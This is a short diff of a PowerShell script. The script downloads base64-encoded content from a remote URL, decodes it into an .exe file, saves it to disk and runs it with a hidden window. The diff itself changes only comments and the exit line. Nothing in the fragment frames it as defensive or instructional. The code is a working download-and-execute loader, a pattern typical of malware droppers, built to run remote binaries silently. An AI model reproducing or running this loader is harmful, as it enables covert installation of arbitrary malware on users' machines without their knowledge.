@@ -8,8 +8,8 @@ $base64Content = (Invoke-WebRequest -Uri $exeUrl -UseBasicParsing).Content
 # Decode the Base64 content and save it as an executable file
 [System.IO.File]::WriteAllBytes($exeFilePath, [Convert]::FromBase64String($base64Content))
 
-# Run the decoded .exe file in the background
+# Run the decoded .exe file in the background (hidden window)
 Start-Process -FilePath $exeFilePath -WindowStyle Hidden
 
-# Exit the PowerShell script
-Exit
+# Close the current PowerShell window
+exit
